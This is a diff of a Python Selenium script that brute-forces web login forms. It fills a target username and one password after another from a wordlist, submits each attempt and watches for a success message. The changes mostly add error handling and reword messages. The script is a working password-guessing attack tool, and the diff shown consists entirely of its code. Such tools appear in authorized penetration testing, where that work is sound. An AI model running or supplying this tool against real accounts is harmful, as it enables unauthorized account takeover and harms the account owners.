@@ -10,24 +10,34 @@ script_name = os.path.basename(__file__)
 
 def try_passwords(driver, username_name, password_name, username, successfulMessage, wordlist):
     found = False
+    print()
+    print('Iniciating the bruteforce...')
+    print()
     with open(wordlist, 'r') as words:
         for word in words:
-
+            
             password = word.strip()
-
-            try:
+                   
+            try:             
                 driver.find_element(By.NAME, username_name).send_keys(username)
+            except:
+                print(f'{Fore.RED}[!] Error: Element not found - {username_name}')
+                sys.exit(1)
+                
+            try:                    
                 driver.find_element(By.NAME, password_name).send_keys(password)
-            except Exception as e:
-                element_name = str(e).split('"')[8]
-                print(f'{Fore.RED}[!] Error: Element not found - {element_name}{Fore.WHITE}')
+            except:
+                print(f'{Fore.RED}[!] Error: Element not found - {password_name}')
                 sys.exit(1)
 
             try:
                 login_button = driver.find_element(By.XPATH, f"//input[@name='{password_name}']/following::button[@type='submit' or @type='button' or not(@type)]")
                 login_button.click()
             except:
-                driver.find_element(By.NAME, password_name).send_keys(Keys.RETURN)
+                try:
+                    driver.find_element(By.NAME, password_name).send_keys(Keys.RETURN)
+                except:
+                    print(f'{Fore.RED}[!] Error: Could not find the login button or submit the form.{Fore.WHITE}')
 
             try:                
                 WebDriverWait(driver, 2).until(lambda driver: successfulMessage in driver.page_source)
@@ -38,8 +48,12 @@ def try_passwords(driver, username_name, password_name, username, successfulMess
             except:
                 pass
 
-            driver.find_element(By.NAME, username_name).clear()
-            driver.find_element(By.NAME, password_name).clear()       
+            try:
+                driver.find_element(By.NAME, username_name).clear()
+                driver.find_element(By.NAME, password_name).clear()
+            except:
+                print(f'{Fore.RED}[!] Error: The specified successful message may be incorrect. {Fore.WHITE}')  
+                sys.exit(1)   
     if not found:
         print(f'{Fore.RED}[-] No words matched.{Fore.WHITE}')
 
@@ -65,7 +79,7 @@ def configure_driver(browser):
         case "edge":
             options = webdriver.EdgeOptions()
         case _ :
-            print(f"{Fore.RED}[!] Unrecognized browser {Fore.WHITE}")
+            print(f"{Fore.RED}[!] Unrecognized browser. {Fore.WHITE}")
             sys.exit(1)
 
     options.add_argument("--headless")
@@ -75,7 +89,7 @@ def configure_driver(browser):
         browser = getattr(webdriver, browser.capitalize())
         driver = browser(options=options)
     except AttributeError:
-        print(f"{Fore.RED}[!] Unrecognized browser {Fore.WHITE}")
+        print(f"{Fore.RED}[!] Unrecognized browser. The browser could not be configured.{Fore.WHITE}")
         sys.exit(1)
 
     return driver
